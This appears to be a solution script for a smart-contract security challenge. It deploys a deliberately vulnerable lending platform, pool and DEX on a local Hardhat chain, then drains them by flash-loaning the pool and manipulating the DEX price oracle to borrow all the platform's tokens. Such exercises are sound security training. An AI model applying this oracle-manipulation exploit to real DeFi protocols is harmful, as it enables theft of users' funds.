const { expect } = require("chai")
const hre = require("hardhat")
const ethers = hre.ethers

///////////////////////////////////////////////////
/*                  CHALLENGE 3                  */
///////////////////////////////////////////////////
describe("Solve Challenge 3", function () {
    const challenger = ethers.provider.getSigner(1)

    it("Check if all of the lending platform's $ISEC has been stolen", async function () {
        msgstr = "\n"

        const challengerAddress = await challenger.getAddress()

        ///////////////////////////////////////////////////
        /*           Deploy Challenge Contract           */
        ///////////////////////////////////////////////////
        const deployer = ethers.provider.getSigner(0)

        const isecTokenFactory = await ethers.getContractFactory("InSecureumToken", deployer)
        const boringTokenFactory = await ethers.getContractFactory("BoringToken", deployer)
        const dexFactory = await ethers.getContractFactory(
            "contracts/Challenge2.DEX.sol:InsecureDexLP",
            deployer
        )
        const poolFactory = await ethers.getContractFactory("InSecureumLenderPool", deployer)
        const lendingPlatformFactory = await ethers.getContractFactory(
            "contracts/Challenge3.borrow_system.sol:BorrowSystemInsecureOracle",
            deployer
        )

        isecToken = await isecTokenFactory.deploy(ethers.utils.parseEther("30000"))
        boringToken = await boringTokenFactory.deploy(ethers.utils.parseEther("20000"))

        await isecToken.deployed()
        await boringToken.deployed()

        dex = await dexFactory.deploy(isecToken.address, boringToken.address)
        await dex.deployed()

        await isecToken.approve(dex.address, ethers.constants.MaxUint256)
        await boringToken.approve(dex.address, ethers.constants.MaxUint256)

        await dex.addLiquidity(ethers.utils.parseEther("100"), ethers.utils.parseEther("100"))

        pool = await poolFactory.deploy(isecToken.address)
        await pool.deployed()

        await isecToken.transfer(pool.address, ethers.utils.parseEther("10000"))

        lendingPlatform = await lendingPlatformFactory.deploy(
            dex.address,
            isecToken.address,
            boringToken.address
        )
        await lendingPlatform.deployed()

        await isecToken.transfer(lendingPlatform.address, ethers.utils.parseEther("10000"))
        await boringToken.transfer(lendingPlatform.address, ethers.utils.parseEther("10000"))

        isecToken = isecToken.connect(challenger)
        boringToken = boringToken.connect(challenger)
        dex = dex.connect(challenger)
        pool = pool.connect(challenger)
        lendingPlatform = lendingPlatform.connect(challenger)

        ///////////////////////////////////////////////////
        /*        Check Status Prior to your Hack        */
        ///////////////////////////////////////////////////

        msgstr = msgstr.concat(
            "\tChallenger $ISEC balance (before your hack): ",
            ethers.utils.formatEther(await isecToken.balanceOf(challengerAddress)),
            "🪙",
            "\n",
            "\tLending platform $ISEC balance (before your hack): ",
            ethers.utils.formatEther(await isecToken.balanceOf(lendingPlatform.address)),
            "🪙",
            "\n\n"
        )

        ///////////////////////////////////////////////////
        /*            Deploy Exploit Contracts           */
        ///////////////////////////////////////////////////

        //======= COMPLETE THIS SECTION AS YOU REQUIRE =======

        let supply, reserve0, reserve1, isecs, bors, amount, tokenPrice, solvent
        async function printDexStats() {
            supply = ethers.utils.formatEther(await dex["totalSupply"]())
            reserve0 = ethers.utils.formatEther(await dex["reserve0"]())
            reserve1 = ethers.utils.formatEther(await dex["reserve1"]())
            console.log(
                `\n\t DEX Stats:\n\tliquidity: %s, reserve0($ISEC): %s, reserve1($BOR): %s`,
                supply,
                reserve0,
                reserve1
            )
        }
        async function printTokensStats(address, acc) {
            isecs = await ethers.utils.formatEther(await isecToken.balanceOf(address))
            bors = await ethers.utils.formatEther(await boringToken.balanceOf(address))

            console.log(`\n\t Token Stats for %s:\n\t $ISEC: %s, $BORS: %s`, acc, isecs, bors)
        }

        let token0Borrowed, token1Borrowed, token0Deposited, token1Deposited, maxBorrow
        async function printLendingPoolStats(address, acc) {
            token0Borrowed = ethers.utils.formatEther(await lendingPlatform.token0Borrowed(address))
            token1Borrowed = ethers.utils.formatEther(await lendingPlatform.token1Borrowed(address))
            token0Deposited = ethers.utils.formatEther(
                await lendingPlatform.token0Deposited(address)
            )
            token1Deposited = ethers.utils.formatEther(
                await lendingPlatform.token1Deposited(address)
            )
            isecs = ethers.utils.formatEther(await isecToken.balanceOf(lendingPlatform.address))
            bors = ethers.utils.formatEther(await boringToken.balanceOf(lendingPlatform.address))
            solvent = await lendingPlatform.isSolvent(address)
            maxBorrow = ethers.utils.formatEther(await lendingPlatform.getMaxBorrow(address))
            console.log(
                `\n\tBorrowSystem $ISEC: ${isecs}, $BOR: ${bors}.`,
                `\n\tStats for ${acc}. Solvent: ${solvent}. Max Borrow: ${maxBorrow}`,
                `\n\t\t$ISEC Deposited: ${token0Deposited}, Borrowed: ${token0Borrowed}`,
                `\n\t\t$BOR Deposited: ${token1Deposited}, Borrowed: ${token1Borrowed}`)
        }

        async function printTokenPrice(amount) {
            tokenPrice = await lendingPlatform.tokenPrice(amount)
            console.log(`\t 💰 ${amount} $BOR == ${tokenPrice} $ISEC `)
        }

        const poolDrainerFactory = await ethers.getContractFactory("Exploit1", challenger)
        const poolDrainer = await poolDrainerFactory.deploy()
        amount = await isecToken.balanceOf(pool.address)
        const calldata = await poolDrainer.interface.encodeFunctionData("run", [amount])

        await pool.flashLoan(poolDrainer.address, calldata)
        await pool.withdraw(amount)

        console.log(`\n👇 After pool drain.`)
        await printDexStats()
        await printTokensStats(challengerAddress, "challenger")
        await printLendingPoolStats(challengerAddress, "challenger")
        await printTokenPrice("1")

        // Authorizing the BorrowSystem to manage tokens on my behalf.
        await isecToken.approve(lendingPlatform.address, ethers.constants.MaxUint256)
        await boringToken.approve(lendingPlatform.address, ethers.constants.MaxUint256)
        amount = ethers.utils.parseEther("1000")
        await lendingPlatform.depositToken0(amount)
        await lendingPlatform.borrowToken1(amount)

        console.log(`\n👇 After depositing 1k ISEC and Borrowing 1k BOR.`)
        await printDexStats()
        await printTokensStats(challengerAddress, "challenger")
        await printTokenPrice("1")
        await printLendingPoolStats(challengerAddress, "challenger")

        // Authorizing the DEX to manage my tokens for the swap.
        await isecToken.approve(dex.address, ethers.constants.MaxUint256)
        await boringToken.approve(dex.address, ethers.constants.MaxUint256)
        await dex.swap(isecToken.address, boringToken.address, amount)
        await lendingPlatform.depositToken1(amount)

        console.log(`\n👇 After swap and deposit.`)
        await printDexStats()
        await printTokensStats(challengerAddress, "challenger")
        await printTokenPrice("1")
        await printLendingPoolStats(challengerAddress, "challenger")

        amount = await isecToken.balanceOf(lendingPlatform.address)
        await lendingPlatform.borrowToken0(amount)

        console.log(`\n👇 After borrowing the remaining.`)
        await printDexStats()
        await printTokensStats(challengerAddress, "challenger")
        await printTokenPrice("1")
        await printLendingPoolStats(challengerAddress, "challenger")

        await isecToken.approve(lendingPlatform.address, 0)
        await boringToken.approve(lendingPlatform.address, 0)

        ///////////////////////////////////////////////////
        /*     Check if Challenge has been solved        */
        ///////////////////////////////////////////////////

        const lendingPostHack = ethers.utils.formatEther(
            await isecToken.balanceOf(lendingPlatform.address)
        )

        msgstr = msgstr.concat(
            "\tChallenger $ISEC balance (after your hack): ",
            ethers.utils.formatEther(await isecToken.balanceOf(challengerAddress)),
            "🪙",
            "\n",
            "\tLending platform $ISEC balance (after your hack): ",
            lendingPostHack,
            "🪙",
            "\n\n"
        )

        msgstr = msgstr.concat("\tYou should've stolen all of the lending platform's $ISEC!\n\n")

        expect(lendingPostHack == 0, msgstr).to.be.true
    })
})
